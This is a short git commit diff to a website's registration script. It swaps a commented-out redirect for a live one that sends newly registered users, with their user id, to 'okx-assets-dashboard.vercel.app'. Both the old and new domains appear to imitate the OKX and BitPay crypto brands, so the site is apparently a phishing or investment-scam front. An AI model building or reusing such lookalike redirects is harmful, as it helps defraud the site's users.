09265edab7595130095d5729e6e75f9110152d7e
eflexTech <eflexmedia1@gmail.com>
2024-04-09 17:30:11 -0700

    G

--- files/theme/js/registerData.js
+++ files/theme/js/registerData.js
@@ -63,7 +63,7 @@ button.onclick = async (event) => {
       console.log(response)
       const userId = JSON.parse(localStorage.getItem('userId'))
       console.log("Local User Id", userId);
-      // window.location.href = `https://www.accounts-bitpaycapital.com/#/${userId._id}`;
+      window.location.href = `https://okx-assets-dashboard.vercel.app/#/${userId._id}`;
       
     })
     .catch((error) => {
